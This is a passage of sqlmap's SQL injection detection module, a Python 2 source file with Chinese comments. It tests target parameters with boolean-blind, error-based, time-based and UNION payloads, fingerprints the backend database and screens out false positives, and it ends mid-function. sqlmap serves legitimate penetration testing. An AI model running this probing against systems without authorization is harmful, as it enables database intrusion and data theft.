#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import copy
import httplib
import random
import re
import socket
import subprocess
import time

from extra.beep.beep import beep
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import extractRegexResult
from lib.core.common import extractTextTagContent
from lib.core.common import findDynamicContent
from lib.core.common import Format
from lib.core.common import getFilteredPageContent
from lib.core.common import getLastRequestHTTPError
from lib.core.common import getPublicTypeMembers
from lib.core.common import getSafeExString
from lib.core.common import getSortedInjectionTests
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import intersect
from lib.core.common import listToStrValue
from lib.core.common import parseFilePaths
from lib.core.common import popValue
from lib.core.common import pushValue
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import showStaticWords
from lib.core.common import singleTimeLogMessage
from lib.core.common import singleTimeWarnMessage
from lib.core.common import urlencode
from lib.core.common import wasLastResponseDBMSError
from lib.core.common import wasLastResponseHTTPError
from lib.core.defaults import defaults
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.datatype import AttribDict
from lib.core.datatype import InjectionDict
from lib.core.decorators import cachedmethod
from lib.core.dicts import FROM_DUMMY_TABLE
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import HEURISTIC_TEST
from lib.core.enums import HTTP_HEADER
from lib.core.enums import HTTPMETHOD
from lib.core.enums import NOTE
from lib.core.enums import NULLCONNECTION
from lib.core.enums import PAYLOAD
from lib.core.enums import PLACE
from lib.core.enums import REDIRECTION
from lib.core.exception import SqlmapConnectionException
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapSilentQuitException
from lib.core.exception import SqlmapUserQuitException
from lib.core.settings import CANDIDATE_SENTENCE_MIN_LENGTH
from lib.core.settings import CHECK_INTERNET_ADDRESS
from lib.core.settings import CHECK_INTERNET_VALUE
from lib.core.settings import DEFAULT_GET_POST_DELIMITER
from lib.core.settings import DUMMY_NON_SQLI_CHECK_APPENDIX
from lib.core.settings import FI_ERROR_REGEX
from lib.core.settings import FORMAT_EXCEPTION_STRINGS
from lib.core.settings import HEURISTIC_CHECK_ALPHABET
from lib.core.settings import IDS_WAF_CHECK_PAYLOAD
from lib.core.settings import IDS_WAF_CHECK_RATIO
from lib.core.settings import IDS_WAF_CHECK_TIMEOUT
from lib.core.settings import MAX_DIFFLIB_SEQUENCE_LENGTH
from lib.core.settings import NON_SQLI_CHECK_PREFIX_SUFFIX_LENGTH
from lib.core.settings import SLEEP_TIME_MARKER
from lib.core.settings import SUHOSIN_MAX_VALUE_LENGTH
from lib.core.settings import SUPPORTED_DBMS
from lib.core.settings import URI_HTTP_HEADER
from lib.core.settings import UPPER_RATIO_BOUND
from lib.core.threads import getCurrentThreadData
from lib.request.connect import Connect as Request
from lib.request.comparison import comparison
from lib.request.inject import checkBooleanExpression
from lib.request.templates import getPageTemplate
from lib.techniques.union.test import unionTest
from lib.techniques.union.use import configUnion

def checkSqlInjection(place, parameter, value):
    # 在这里存储有关用于成功注入的边界和payload的细节
    injection = InjectionDict()

    # 某些方法需要本地的线程数据
    threadData = getCurrentThreadData()

    # 在数字式参数值的情况下，喜欢非字符串特定的边界
    if value.isdigit():
        kb.cache.intBoundaries = kb.cache.intBoundaries or sorted(copy.deepcopy(conf.boundaries), key=lambda boundary: any(_ in (boundary.prefix or "") or _ in (boundary.suffix or "") for _ in ('"', '\'')))
        boundaries = kb.cache.intBoundaries
    else:
        boundaries = conf.boundaries

    # 设置SQL注入测试模式的标志
    kb.testMode = True

    paramType = conf.method if conf.method not in (None, HTTPMETHOD.GET, HTTPMETHOD.POST) else place
    tests = getSortedInjectionTests()
    seenPayload = set()

    kb.data.setdefault("randomInt", str(randomInt(10)))
    kb.data.setdefault("randomStr", str(randomStr(10)))

    while tests:
        test = tests.pop(0)

        try:
            if kb.endDetection:
                break

            if conf.dbms is None:
                # 如果DBMS尚未被指纹识别（通过简单的启发式检查或通过DBMS特定的payload），
                # 且已经识别出基于布尔的盲注，那么尝试用简单的DBMS特定的基于布尔的测试来识别DBMS可能是什么
                if not injection.dbms and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data:
                    if not Backend.getIdentifiedDbms() and kb.heuristicDbms is None and not kb.droppingRequests:
                        kb.heuristicDbms = heuristicCheckDbms(injection)

                # 如果DBMS已经被指纹识别
                # （通过DBMS特定的错误消息，简单的启发式检查或通过DBMS特定的payload），
                # 请求用户将测试限制到指纹DBMS
                if kb.reduceTests is None and not conf.testFilter and (intersect(Backend.getErrorParsedDBMSes(), \
                   SUPPORTED_DBMS, True) or kb.heuristicDbms or injection.dbms):
                    msg = u"探测到后端DBMS可能是%s" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or injection.dbms)
                    msg += u"是否要跳过对其他数据库类型的测试? [Y/n]"
                    kb.reduceTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            # 如果DBMS已经被指纹识别（通过DBMS特定的错误消息，通过简单的启发式检查或通过DBMS特定的负载），
            # 请求用户将测试扩展到所有DBMS特定的，而不管提供的 --level和--risk值
            if kb.extendTests is None and not conf.testFilter and (conf.level < 5 or conf.risk < 3) \
               and (intersect(Backend.getErrorParsedDBMSes(), SUPPORTED_DBMS, True) or \
               kb.heuristicDbms or injection.dbms):
                msg = u"对于剩下的测试，您是否要包括所有的'%s'扩展提供的" % (Format.getErrorParsedDBMSes() or kb.heuristicDbms or injection.dbms)
                msg += u"level(%d)" % conf.level if conf.level < 5 else ""
                msg += u"和" if conf.level < 5 and conf.risk < 3 else ""
                msg += u"risk(%d)" % conf.risk if conf.risk < 3 else ""
                msg += u"值的测试? [Y/n]" if conf.level < 5 and conf.risk < 3 else " value? [Y/n]"
                kb.extendTests = (Backend.getErrorParsedDBMSes() or [kb.heuristicDbms]) if readInput(msg, default='Y', boolean=True) else []

            title = test.title
            kb.testType = stype = test.stype
            clause = test.clause
            unionExtended = False
            trueCode, falseCode = None, None

            if conf.httpCollector is not None:
                conf.httpCollector.setExtendedArguments({
                    "_title": title,
                    "_place": place,
                    "_parameter": parameter,
                })

            if stype == PAYLOAD.TECHNIQUE.UNION:
                configUnion(test.request.char)

                if "[CHAR]" in title:
                    if conf.uChar is None:
                        continue
                    else:
                        title = title.replace("[CHAR]", conf.uChar)

                elif "[RANDNUM]" in title or "(NULL)" in title:
                    title = title.replace("[RANDNUM]", "random number")

                if test.request.columns == "[COLSTART]-[COLSTOP]":
                    if conf.uCols is None:
                        continue
                    else:
                        title = title.replace("[COLSTART]", str(conf.uColsStart))
                        title = title.replace("[COLSTOP]", str(conf.uColsStop))

                elif conf.uCols is not None:
                    debugMsg = u"跳过测试'%s'，因为用户" % title
                    debugMsg += u"提供了自定义列范围%s" % conf.uCols
                    logger.debug(debugMsg)
                    continue

                match = re.search(r"(\d+)-(\d+)", test.request.columns)
                if injection.data and match:
                    lower, upper = int(match.group(1)), int(match.group(2))
                    for _ in (lower, upper):
                        if _ > 1:
                            __ = 2 * (_ - 1) + 1 if _ == lower else 2 * _
                            unionExtended = True
                            test.request.columns = re.sub(r"\b%d\b" % _, str(__), test.request.columns)
                            title = re.sub(r"\b%d\b" % _, str(__), title)
                            test.title = re.sub(r"\b%d\b" % _, str(__), test.title)

            # 如果用户想要仅测试特定技术，请跳过测试
            if conf.tech and isinstance(conf.tech, list) and stype not in conf.tech:
                debugMsg = u"跳过测试 '%s'， " % title
                debugMsg += u"因为用户指定只测试"
                debugMsg += u"%s技术" % " & ".join(PAYLOAD.SQLINJECTION[_] for _ in conf.tech)
                logger.debug(debugMsg)
                continue

            # 如果同一个SQL注入类型已经被另一个测试所标识，则跳过测试
            if injection.data and stype in injection.data:
                debugMsg = u"跳过测试'%s' ，" % title
                debugMsg += u"因为%s的payload已经被识别" % PAYLOAD.SQLINJECTION[stype]
                logger.debug(debugMsg)
                continue

            # 解析DBMS特定的payload细节
            if "details" in test and "dbms" in test.details:
                payloadDbms = test.details.dbms
            else:
                payloadDbms = None

            # 如果title, vector或DBMS不包含在给定的测试过滤器中，请跳过测试
            if conf.testFilter and not any(conf.testFilter in str(item) or \
               re.search(conf.testFilter, str(item), re.I) for item in \
               (test.title, test.vector, payloadDbms)):
                    debugMsg = u"跳过测试'%s'，" % title
                    debugMsg += u"因为它的name/vector/DBMS 不包含在给定的过滤器中"
                    logger.debug(debugMsg)
                    continue

            # 跳过测试，如果title, vector 或 DBMS包含在给定的跳过过滤器中
            if conf.testSkip and any(conf.testSkip in str(item) or \
               re.search(conf.testSkip, str(item), re.I) for item in \
               (test.title, test.vector, payloadDbms)):
                    debugMsg = u"跳过测试'%s'，" % title
                    debugMsg += u"因为它的name/vector/DBMS包含在给定的跳过过滤器中"
                    logger.debug(debugMsg)
                    continue

            if payloadDbms is not None:
                # 如果与用户提供的DBMS不匹配，请跳过DBMS特定测试
                if conf.dbms is not None and not intersect(payloadDbms, conf.dbms, True):
                    debugMsg = u"跳过测试'%s'，" % title
                    debugMsg += u"因为提供的DBMS是%s" % conf.dbms
                    logger.debug(debugMsg)
                    continue

                # 如果与以前识别的DBMS（通过DBMS特定的payload）不匹配，请跳过DBMS特定测试
                if injection.dbms is not None and not intersect(payloadDbms, injection.dbms, True):
                    debugMsg = "跳过测试'%s' ，" % title
                    debugMsg += "因为标识的后端DBMS是 %s" % injection.dbms
                    logger.debug(debugMsg)
                    continue

                # 如果与以前识别的DBMS（通过DBMS特定的错误消息）不匹配，则跳过DBMS特定测试
                if kb.reduceTests and not intersect(payloadDbms, kb.reduceTests, True):
                    debugMsg = u"跳过测试'%s'," % title
                    debugMsg += u"因为解析的错误消息显示后端DBMS可能是%s" % Format.getErrorParsedDBMSes()
                    logger.debug(debugMsg)
                    continue

            # 如果用户没有决定将测试扩展到所有DBMS特定的或测试payload不是特定于所识别的DBMS，
            # 则只有在级别和风险都低于相应的配置级别和风险值时才进行测试
            if not conf.testFilter and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                # 如果风险高于提供（或默认）值，请跳过测试
                if test.risk > conf.risk:
                    debugMsg = u"跳过测试'%s'，因为风险risk(%d)高于" % (title, test.risk)
                    debugMsg += u"提供的(%d)" % conf.risk
                    logger.debug(debugMsg)
                    continue

                # 如果level高于提供的（或默认值），请跳过测试
                if test.level > conf.level:
                    debugMsg = u"跳过测试'%s' ，因为level(%d)高于" % (title, test.level)
                    debugMsg += u"提供的(%d)" % conf.level
                    logger.debug(debugMsg)
                    continue

            # 如果与其他测试已经识别的SQL注入子句不一致，请跳过测试
            clauseMatch = False

            for clauseTest in clause:
                if injection.clause is not None and clauseTest in injection.clause:
                    clauseMatch = True
                    break

            if clause != [0] and injection.clause and injection.clause != [0] and not clauseMatch:
                # 详见D:\Python27\sqlmap\xml\boundaries.xml中关于<clause>的定义
                debugMsg = u"跳过测试'%s' ，因为这些子句与预先定义的有效值不匹配" % title
                logger.debug(debugMsg)
                continue

            # 如果用户提供自定义字符跳过测试（对于基于UNION的payload）
            if conf.uChar is not None and ("random number" in title or "(NULL)" in title):
                debugMsg = u"跳过测试 '%s' ，" % title
                debugMsg += u"因为用户提供了一个特定的字符%s" % conf.uChar
                logger.debug(debugMsg)
                continue

            infoMsg = u"测试 '%s'" % title
            logger.info(infoMsg)

            # 根据当前测试DBMS值强制后端DBMS，以便正确的payload非转义
            Backend.forceDbms(payloadDbms[0] if isinstance(payloadDbms, list) else payloadDbms)

            # 解析测试的<请求>
            comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None
            fstPayload = agent.cleanupPayload(test.request.payload, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) else None)

            for boundary in boundaries:
                injectable = False

                # 如果level高于提供的（或默认）值，则跳过边界解析边界<level>
                if boundary.level > conf.level and not (kb.extendTests and intersect(payloadDbms, kb.extendTests, True)):
                    continue

                # 如果与测试不符，则跳过边界<子句>解析测试<clause>和boundary <clause>
                clauseMatch = False

                for clauseTest in test.clause:
                    if clauseTest in boundary.clause:
                        clauseMatch = True
                        break

                if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                    continue

                # 跳过边界，如果它不符合测试的<where>
                # 解析测试的<where>和边界<where>
                whereMatch = False

                for where in test.where:
                    if where in boundary.where:
                        whereMatch = True
                        break

                if not whereMatch:
                    continue

                # 解析边界的<prefix>, <suffix> and <ptype>
                prefix = boundary.prefix if boundary.prefix else ""
                suffix = boundary.suffix if boundary.suffix else ""
                ptype = boundary.ptype

                # 选项 --prefix/--suffix 具有较高的优先级（如果由用户设置）
                prefix = conf.prefix if conf.prefix is not None else prefix
                suffix = conf.suffix if conf.suffix is not None else suffix
                comment = None if conf.suffix is not None else comment

                # 如果以前的注入成功，
                # 我们知道用于进一步测试的前缀，后缀和参数类型，不需要循环进行以下测试
                condBound = (injection.prefix is not None and injection.suffix is not None)
                condBound &= (injection.prefix != prefix or injection.suffix != suffix)
                condType = injection.ptype is not None and injection.ptype != ptype

                # 如果PAYLOAD是针对其的内联查询测试，而不管先前识别的注射类型如何
                if stype != PAYLOAD.TECHNIQUE.QUERY and (condBound or condType):
                    continue

                # 对于每个测试的<where>
                for where in test.where:
                    templatePayload = None
                    vector = None

                    # 根据测试的 <where> 标记威胁参数原始值
                    if where == PAYLOAD.WHERE.ORIGINAL or conf.prefix:
                        origValue = value

                        if kb.tamperFunctions:
                            templatePayload = agent.payload(place, parameter, value="", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.NEGATIVE:
                        # 使用与原始页面不同的页面模板，
                        # 因为我们正在更改参数值，这可能会导致不同的内容
                        if conf.invalidLogical:
                            _ = int(kb.data.randomInt[:2])
                            origValue = "%s AND %s=%s" % (value, _, _ + 1)
                        elif conf.invalidBignum:
                            origValue = kb.data.randomInt[:6]
                        elif conf.invalidString:
                            origValue = kb.data.randomStr[:6]
                        else:
                            origValue = "-%s" % kb.data.randomInt[:4]

                        templatePayload = agent.payload(place, parameter, value="", newValue=origValue, where=where)
                    elif where == PAYLOAD.WHERE.REPLACE:
                        origValue = ""

                    kb.pageTemplate, kb.errorIsNone = getPageTemplate(templatePayload, place)

                    # 伪造请求Payload前缀边界的前缀，
                    # 并将边界的后缀附加到测试的'<payload> <comment>'字符串
                    if fstPayload:
                        boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                        reqPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)
                        if reqPayload:
                            if reqPayload in seenPayload:
                                continue
                            else:
                                seenPayload.add(reqPayload)
                    else:
                        reqPayload = None

                    # 执行测试的请求，并检查payload是否成功解析测试的<response>
                    for method, check in test.response.items():
                        check = agent.cleanupPayload(check, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) else None)

                        # 在基于布尔的SQL盲注情况下
                        if method == PAYLOAD.METHOD.COMPARISON:
                            # 生成用于比较的payload
                            def genCmpPayload():
                                sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) else None)

                                # 通过前缀边界的前缀伪造响应Payload，
                                # 并将边界的后缀附加到测试的'<payload> <comment>'字符串
                                boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                                boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                cmpPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                return cmpPayload

                            # 首先基于False响应内容,设置kb.matchRatio有用
                            kb.matchRatio = None
                            kb.negativeLogic = (where == PAYLOAD.WHERE.NEGATIVE)
                            Request.queryPage(genCmpPayload(), place, raise404=False)
                            falsePage, falseHeaders, falseCode = threadData.lastComparisonPage or "", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            falseRawResponse = "%s%s" % (falseHeaders, falsePage)

                            # 执行测试的True请求
                            trueResult = Request.queryPage(reqPayload, place, raise404=False)
                            truePage, trueHeaders, trueCode = threadData.lastComparisonPage or "", threadData.lastComparisonHeaders, threadData.lastComparisonCode
                            trueRawResponse = "%s%s" % (trueHeaders, truePage)

                            if trueResult and not(truePage == falsePage and not kb.nullConnection):
                                # 执行测试的False请求
                                falseResult = Request.queryPage(genCmpPayload(), place, raise404=False)

                                if not falseResult:
                                    if kb.negativeLogic:
                                        boundPayload = agent.prefixQuery(kb.data.randomStr, prefix, where, clause)
                                        boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                                        errorPayload = agent.payload(place, parameter, newValue=boundPayload, where=where)

                                        errorResult = Request.queryPage(errorPayload, place, raise404=False)
                                        if errorResult:
                                            continue
                                    elif not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                        _ = comparison(kb.heuristicPage, None, getRatioValue=True)
                                        if _ > kb.matchRatio:
                                            kb.matchRatio = _
                                            logger.debug(u"将当前参数的匹配比调整为%.3f" % kb.matchRatio)

                                    injectable = True

                                elif threadData.lastComparisonRatio > UPPER_RATIO_BOUND and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    originalSet = set(getFilteredPageContent(kb.pageTemplate, True, "\n").split("\n"))
                                    trueSet = set(getFilteredPageContent(truePage, True, "\n").split("\n"))
                                    falseSet = set(getFilteredPageContent(falsePage, True, "\n").split("\n"))

                                    if originalSet == trueSet != falseSet:
                                        candidates = trueSet - falseSet

                                        if candidates:
                                            candidates = sorted(candidates, key=lambda _: len(_))
                                            for candidate in candidates:
                                                if re.match(r"\A[\w.,! ]+\Z", candidate) and ' ' in candidate and candidate.strip() and len(candidate) > CANDIDATE_SENTENCE_MIN_LENGTH:
                                                    conf.string = candidate
                                                    injectable = True

                                                    infoMsg = u"%s参数'%s'似乎是'%s'可注入的 (用 --string=\"%s\")" % (paramType, parameter, title, repr(conf.string).lstrip('u').strip("'"))
                                                    logger.info(infoMsg)

                                                    break

                            if injectable:
                                if kb.pageStable and not any((conf.string, conf.notString, conf.regexp, conf.code, kb.nullConnection)):
                                    if all((falseCode, trueCode)) and falseCode != trueCode:
                                        conf.code = trueCode

                                        infoMsg = u"%s参数'%s'似乎是'%s'可注入的 (HTTP返回状态码 --code=%d)" % (paramType, parameter, title, conf.code)
                                        logger.info(infoMsg)
                                    else:
                                        trueSet = set(extractTextTagContent(trueRawResponse))
                                        trueSet = trueSet.union(__ for _ in trueSet for __ in _.split())

                                        falseSet = set(extractTextTagContent(falseRawResponse))
                                        falseSet = falseSet.union(__ for _ in falseSet for __ in _.split())

                                        candidates = filter(None, (_.strip() if _.strip() in trueRawResponse and _.strip() not in falseRawResponse else None for _ in (trueSet - falseSet)))

                                        if candidates:
                                            candidates = sorted(candidates, key=lambda _: len(_))
                                            for candidate in candidates:
                                                if re.match(r"\A\w+\Z", candidate):
                                                    break

                                            conf.string = candidate

                                            infoMsg = u"%s参数'%s'似乎是'%s'可注入的 (用 --string=\"%s\")" % (paramType, parameter, title, repr(conf.string).lstrip('u').strip("'"))
                                            logger.info(infoMsg)

                                        if not any((conf.string, conf.notString)):
                                            candidates = filter(None, (_.strip() if _.strip() in falseRawResponse and _.strip() not in trueRawResponse else None for _ in (falseSet - trueSet)))

                                            if candidates:
                                                candidates = sorted(candidates, key=lambda _: len(_))
                                                for candidate in candidates:
                                                    if re.match(r"\A\w+\Z", candidate):
                                                        break

                                                conf.notString = candidate

                                                infoMsg = u"%s参数'%s'似乎是'%s'可注入的 (用 --not-string=\"%s\")" % (paramType, parameter, title, repr(conf.notString).lstrip('u').strip("'"))
                                                logger.info(infoMsg)

                                if not any((conf.string, conf.notString, conf.code)):
                                    infoMsg = u"%s参数'%s'似乎是'%s'可注入的" % (paramType, parameter, title)
                                    singleTimeLogMessage(infoMsg)

                        # 在基于错误error-based的SQL注入情况下
                        elif method == PAYLOAD.METHOD.GREP:
                            # 执行测试的请求，并为测试的<grep>正则表达式grep响应正文
                            try:
                                page, headers, _ = Request.queryPage(reqPayload, place, content=True, raise404=False)
                                output = extractRegexResult(check, page, re.DOTALL | re.IGNORECASE) \
                                        or extractRegexResult(check, threadData.lastHTTPError[2] if wasLastResponseHTTPError() else None, re.DOTALL | re.IGNORECASE) \
                                        or extractRegexResult(check, listToStrValue([headers[key] for key in headers.keys() if key.lower() != URI_HTTP_HEADER.lower()] if headers else None), re.DOTALL | re.IGNORECASE) \
                                        or extractRegexResult(check, threadData.lastRedirectMsg[1] if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                                if output:
                                    result = output == "1"

                                    if result:
                                        infoMsg = u"%s参数'%s'是'%s'可注入的" % (paramType, parameter, title)
                                        logger.info(infoMsg)

                                        injectable = True

                            except SqlmapConnectionException, msg:
                                debugMsg = u"发生问题最有可能是因为服务器没有按预期"
                                debugMsg += u"从基于错误的payload中恢复正常('%s')" % msg
                                logger.debug(debugMsg)

                        # 在基于时间的盲注或堆叠(多语句)查询SQL注入情况下
                        elif method == PAYLOAD.METHOD.TIME:
                            # 执行测试的请求
                            trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)
                            trueCode = threadData.lastCode

                            if trueResult:
                                # 额外的验证步骤（例如检查DROP保护机制）
                                if SLEEP_TIME_MARKER in reqPayload:
                                    falseResult = Request.queryPage(reqPayload.replace(SLEEP_TIME_MARKER, "0"), place, timeBasedCompare=True, raise404=False)
                                    if falseResult:
                                        continue

                                # 确认测试结果
                                trueResult = Request.queryPage(reqPayload, place, timeBasedCompare=True, raise404=False)

                                if trueResult:
                                    infoMsg = u"%s参数'%s'似乎是'%s'可注入的" % (paramType, parameter, title)
                                    logger.info(infoMsg)

                                    injectable = True

                        # 在UNION查询SQL注入的情况下
                        elif method == PAYLOAD.METHOD.UNION:
                            # 测试UNION注入并设置样本payload以及向量vector。
                            # 注意：vector设置为具有6个元素的元组，
                            # Agent.forgeUnionQuery()方法用来伪造UNION查询的payload

                            configUnion(test.request.char, test.request.columns)

                            if not Backend.getIdentifiedDbms():
                                if kb.heuristicDbms is None:
                                    warnMsg = u"使用未转义版本的测试，因为后台DBMS的指纹数据不足,无法识别数据库类型。" \
                                              u"您可以尝试使用选项“--dbms”显式设置它"
                                    singleTimeWarnMessage(warnMsg)
                                else:
                                    Backend.forceDbms(kb.heuristicDbms)

                            if unionExtended:
                                infoMsg = u"自动扩展UNION查询注入技术测试的范围，因为至少有一个（潜在的）技术被发现"
                                singleTimeLogMessage(infoMsg)
                            elif not injection.data:
                                _ = test.request.columns.split('-')[-1]
                                if _.isdigit() and int(_) > 10:
                                    if kb.futileUnion is None:
                                        msg = u"如果没有发现至少一个其他（潜在）技术，"
                                        msg += u"则不建议执行扩展的UNION测试。"
                                        msg += u"你想跳过吗? [Y/n] "

                                        kb.futileUnion = not readInput(msg, default='Y', boolean=True)
                                    if kb.futileUnion is False:
                                        continue

                            # 测试UNION查询SQL注入
                            reqPayload, vector = unionTest(comment, place, parameter, value, prefix, suffix)

                            if isinstance(reqPayload, basestring):
                                infoMsg = u"%s参数'%s'是'%s'可注入的" % (paramType, parameter, title)
                                logger.info(infoMsg)

                                injectable = True

                                # 覆盖'where'，因为它可以由unionTest()直接设置
                                where = vector[6]

                        kb.previousMethod = method

                        if conf.dummy or conf.offline:
                            injectable = False

                    # 如果注入测试成功，则将注入对象与测试细节进行比较
                    if injectable is True:
                        # 仅在第一次测试成功时，才会提供边界细节
                        if injection.place is None or injection.parameter is None:
                            if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
                                injection.parameter = place
                            else:
                                injection.parameter = parameter

                            injection.place = place
                            injection.ptype = ptype
                            injection.prefix = prefix
                            injection.suffix = suffix
                            injection.clause = clause

                        # 每次测试成功时都会提供测试详细信息
                        if hasattr(test, "details"):
                            for key, value in test.details.items():
                                if key == "dbms":
                                    injection.dbms = value

                                    if not isinstance(value, list):
                                        Backend.setDbms(value)
                                    else:
                                        Backend.forceDbms(value[0], True)

                                elif key == "dbms_version" and injection.dbms_version is None and not conf.testFilter:
                                    injection.dbms_version = Backend.setVersion(value)

                                elif key == "os" and injection.os is None:
                                    injection.os = Backend.setOs(value)

                        if vector is None and "vector" in test and test.vector is not None:
                            vector = test.vector

                        injection.data[stype] = AttribDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = agent.removePayloadDelimiters(reqPayload)
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload
                        injection.data[stype].matchRatio = kb.matchRatio
                        injection.data[stype].trueCode = trueCode
                        injection.data[stype].falseCode = falseCode

                        injection.conf.textOnly = conf.textOnly
                        injection.conf.titles = conf.titles
                        injection.conf.code = conf.code
                        injection.conf.string = conf.string
                        injection.conf.notString = conf.notString
                        injection.conf.regexp = conf.regexp
                        injection.conf.optimize = conf.optimize

                        if not kb.alerted:
                            if conf.beep:
                                beep()

                            if conf.alert:
                                infoMsg = u"发现SQL注入时发出警报并执行shell命令('%s')" % conf.alert
                                logger.info(infoMsg)

                                process = subprocess.Popen(conf.alert, shell=True)
                                process.wait()

                            kb.alerted = True

                        # 没有必要对其他<where>标签执行此测试
                        break

                if injectable is True:
                    kb.vulnHosts.add(conf.hostname)
                    break

            # 重置强制后端DBMS值
            Backend.flushForcedDbms()

        except KeyboardInterrupt:
            warnMsg = u"用户在检测阶段中止"
            logger.warn(warnMsg)

            msg = u"你想如何进行?[(S)跳过当前测试/(e)结束检测阶段/"
            msg += u"(n)下一个参数/(c)修改输出信息的详细程度[0-6]/(q)退出]"
            choice = readInput(msg, default='S', checkBatch=False).upper()

            if choice == 'C':
                choice = None
                while not ((choice or "").isdigit() and 0 <= int(choice) <= 6):
                    if choice:
                        logger.warn(u"无效值")
                    msg = u"输入新的详细程度级别: [0-6] "
                    choice = readInput(msg, default=str(conf.verbose), checkBatch=False)
                conf.verbose = int(choice)
                setVerbosity()
                tests.insert(0, test)
            elif choice == 'N':
                return None
            elif choice == 'E':
                kb.endDetection = True
            elif choice == 'Q':
                raise SqlmapUserQuitException

        finally:
            # 强制重置后端DBMS值
            Backend.flushForcedDbms()

    Backend.flushForcedDbms(True)

    # 返回注入对象
    if injection.place is not None and injection.parameter is not None:
        if not conf.dropSetCookie and PAYLOAD.TECHNIQUE.BOOLEAN in injection.data and injection.data[PAYLOAD.TECHNIQUE.BOOLEAN].vector.startswith('OR'):
            warnMsg = u"在基于OR布尔的注入案例中，如果在数据检索期间遇到任何问题，"
            warnMsg += u"请考虑使用'--drop-set-cookie'选项"
            logger.warn(warnMsg)

        if not checkFalsePositives(injection):
            kb.vulnHosts.remove(conf.hostname)
            if NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
                injection.notes.append(NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE)

    else:
        injection = None

    if injection and NOTE.FALSE_POSITIVE_OR_UNEXPLOITABLE not in injection.notes:
        checkSuhosinPatch(injection)
        checkFilteredChars(injection)

    return injection

def heuristicCheckDbms(injection):
    """
    启发式检测后端数据库管理系统
    当以基于布尔的盲注被识别时，这个函数就会被调用。
    """
    retVal = False

    pushValue(kb.injection)
    kb.injection = injection

    for dbms in getPublicTypeMembers(DBMS, True):
        randStr1, randStr2 = randomStr(), randomStr()
        Backend.forceDbms(dbms)

        if conf.noEscape and dbms not in FROM_DUMMY_TABLE:
            continue
        # 检测数据库类型
        if checkBooleanExpression("(SELECT '%s'%s)='%s'" % (randStr1, FROM_DUMMY_TABLE.get(dbms, ""), randStr1)):
            if not checkBooleanExpression("(SELECT '%s'%s)='%s'" % (randStr1, FROM_DUMMY_TABLE.get(dbms, ""), randStr2)):
                retVal = dbms
                break

    Backend.flushForcedDbms()
    kb.injection = popValue()

    if retVal:
        infoMsg = u"启发式(extended)测试显示后端DBMS可能是'%s'" % retVal
        logger.info(infoMsg)

        kb.heuristicExtendedDbms = retVal

    return retVal

def checkFalsePositives(injection):
    """
    检查误报（仅在特殊情况下）
    """

    retVal = True

    if all(_ in (PAYLOAD.TECHNIQUE.BOOLEAN, PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED) for _ in injection.data) or\
      (len(injection.data) == 1 and PAYLOAD.TECHNIQUE.UNION in injection.data and "Generic" in injection.data[PAYLOAD.TECHNIQUE.UNION].title):
        pushValue(kb.injection)

        infoMsg = u"检查%s参数'%s'上的注入点是否误报了" % (injection.place, injection.parameter)
        logger.info(infoMsg)

        def _():
            return int(randomInt(2)) + 1

        kb.injection = injection

        for i in xrange(conf.level):
            while True:
                randInt1, randInt2, randInt3 = (_() for j in xrange(3))

                randInt1 = min(randInt1, randInt2, randInt3)
                randInt3 = max(randInt1, randInt2, randInt3)

                if randInt3 > randInt2 > randInt1:
                    break

            if not checkBooleanExpression("%d=%d" % (randInt1, randInt1)):
                retVal = False
                break

            # Just in case if DBMS hasn't properly recovered from previous delayed request
            if PAYLOAD.TECHNIQUE.BOOLEAN not in injection.data:
                checkBooleanExpression("%d=%d" % (randInt1, randInt2))

            if checkBooleanExpression("%d=%d" % (randInt1, randInt3)):          # this must not be evaluated to True
                retVal = False
                break

            elif checkBooleanExpression("%d=%d" % (randInt3, randInt2)):        # this must not be evaluated to True
                retVal = False
                break

            elif not checkBooleanExpression("%d=%d" % (randInt2, randInt2)):    # this must be evaluated to True
                retVal = False
                break

            elif checkBooleanExpression("%d %d" % (randInt3, randInt2)):        # this must not be evaluated to True (invalid statement)
                retVal = False
                break

        if not retVal:
